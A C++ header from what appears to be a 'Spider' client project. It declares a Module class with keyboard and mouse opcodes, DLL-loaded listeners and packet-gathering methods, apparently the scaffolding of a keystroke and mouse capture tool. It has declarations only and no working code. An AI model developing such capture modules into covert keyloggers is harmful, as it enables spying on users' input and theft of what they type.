//
// Created by lavigne on 10/5/17.
//

#ifndef MODULE_HPP
#define MODULE_HPP

#define OP_KEYBOARD 0x04
#define OP_MOUSE 0x05

# include "IListener.hh"
# include "client/SpiderClient.hpp"

class   Module
{
protected:
	std::string _filenameListener;
	char _opcode;
	IListener* _listener;
	HINSTANCE _dll;
public:
	/* Constr & Destr */
	Module(char opcode, const std::string& filenameListener);
	//Module(Module& copy);
	Module();
	Module& operator=(Module& copy);
	//void    setFilenameListener(std::string filenameListener);
	void    run();

	virtual ~Module();

	/*Getters & Setters*/
	char    getOpcode(); // identifier module
	void    setOpcode(char op);
	const std::string& getFilenameListener() const;


	/* Doing */
	void    addNextData(t_paquet *); //
	size_t  getDataSize();
	const std::string& getFilenameOutput() const;
	int loadListener();
	int unloadListener();
	void load(char opcode);
//	char    getOpcode(); // identifier module
	void    getDatas(t_paquet *);
	std::string getFilename();
	std::list<std::string> getElements();
};

#endif //MODULE_HPP